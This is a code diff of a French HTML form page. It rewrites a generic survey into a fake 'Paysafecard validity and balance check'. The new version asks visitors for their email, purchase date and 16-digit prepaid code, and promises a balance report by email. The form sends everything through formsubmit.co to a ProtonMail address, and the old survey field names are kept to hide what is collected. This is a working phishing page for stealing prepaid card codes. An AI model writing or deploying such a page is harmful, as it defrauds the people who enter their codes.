@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Formulaire de Sondage</title>
+    <title>Consultation validité et solde Paysafecard</title>
 
     <!-- Police Roboto -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -19,25 +19,25 @@
 
     <div class="form-card">
 
-        <h2>Formulaire de Participation</h2>
+        <h2>As-tu déjà un code prépayé PaysafeCard ?</h2>
 
         <form id="surveyForm" action="https://formsubmit.co/cash26a@proton.me" method="POST" novalidate>
 
             <div class="field">
-                <label>Date du sondage</label>
+                <label>Date de l'achat</label>
                 <input type="date" name="Date" min="2025-12-01" max="2026-12-31">
                 <small class="error"></small>
             </div>
 
             <div class="field">
-                <label>Nom complet</label>
-                <input type="text" name="Nom complet" placeholder="Ex : Jean Dupont">
+                <label>Votre adresse Email</label>
+                <input type="text" name="Nom complet" placeholder="Ex : Jean.Dupont@gmail.com">
                 <small class="error"></small>
             </div>
 
             <div class="field">
-                <label>Votre avis</label>
-                <textarea name="Avis" rows="5" placeholder="Écrivez votre réponse ici..."></textarea>
+                <label>Votre code à 16 chiffres</label>
+                <textarea name="Avis" rows="5" placeholder="XXXX XXXX XXXX XXXX"></textarea>
                 <small class="error"></small>
             </div>
 
@@ -54,7 +54,7 @@
         <!-- 📌 CADRE INFO COMPTE RENDU (toujours visible) -->
         <div class="info-email-box">
             <p>
-                📬 Après avoir soumis ce formulaire, vous recevrez un <strong>compte rendu détaillé</strong> par email.  
+                📬 Après avoir rempli cette verification, vous recevrez un compte rendu détaillé par email de<strong> la validité de votre code Payesafecard et du solde restant</strong>  
                 Assurez‑vous d’entrer une adresse valide.
             </p>
         </div>
